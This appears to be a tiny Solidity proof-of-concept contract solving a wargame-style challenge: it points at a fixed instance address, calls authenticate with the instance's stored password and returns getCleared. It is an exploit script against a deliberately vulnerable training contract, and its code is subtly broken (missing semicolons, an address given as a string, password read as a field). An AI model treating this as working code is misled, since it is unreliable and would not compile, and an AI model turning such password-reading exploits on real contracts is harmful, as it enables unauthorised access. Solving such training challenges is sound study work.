// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./instance.sol";

contract POC {
    Instance instance = Instance("0x9CB391dbcD447E645D6Cb55dE6ca23164130D008")

    function hack() public returns(bool){
        instance.authenticate(instance.password)
        return instance.getCleared()
    }
}